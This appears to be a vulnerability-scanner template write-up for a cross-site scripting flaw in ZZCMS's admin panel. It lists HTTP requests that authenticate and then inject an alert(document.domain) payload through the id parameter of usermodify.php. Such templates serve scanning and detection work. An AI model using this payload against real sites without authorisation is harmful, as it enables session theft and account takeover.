# Nuclei Template: ZZCMS - Cross-Site Scripting
**Template ID:** zzcms-xss
**Vulnerability Class:** Cross-site Scripting (XSS) - Generic
**Severity:** High
**CWE:** CWE-79
**Source:** Nuclei Template (`zzcms-xss.yaml`)

## Vulnerability Information & PoC

## Description
ZZCMS contains a cross-site scripting vulnerability. An attacker can execute arbitrary script and thus steal cookie-based authentication credentials and launch other attacks.

## Steps to reproduce / Exploit Payload
```http
POST /admin/logincheck.php HTTP/1.1
Host: {{Hostname}}
Content-Type: application/x-www-form-urlencoded

admin={{username}}&pass={{password}}

GET /admin/usermodify.php?id=1%22%2balert(document.domain)%2b%22 HTTP/1.1
Host: {{Hostname}}
```

## References
- https://github.com/JcQSteven/blog/issues/20
